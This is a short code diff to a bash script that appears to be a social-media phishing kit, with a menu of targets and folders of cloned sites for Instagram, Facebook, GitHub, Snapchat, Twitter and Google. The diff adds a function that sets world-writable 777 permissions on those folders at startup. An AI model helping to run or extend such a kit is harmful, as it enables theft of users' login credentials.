@@ -13,6 +13,11 @@ command -v curl > /dev/null 2>&1 || { echo >&2 "I need curl "; exit 1; }
 
 }
 
+chmod_1(){
+        chmod 777 *
+        chmod 777 sites/instaram sites/facebook sites/github sites/snapchat sites/twitter sites/google sites/instagram/index_files/
+}
+
 menu() {
 
 printf "\e[1;93m [1]~Instagram\t"  | lolcat -p -a -d 7
@@ -307,7 +312,7 @@ sleep 1
 done 
 
 }
+chmod_1
 banner
 depen
 menu
-
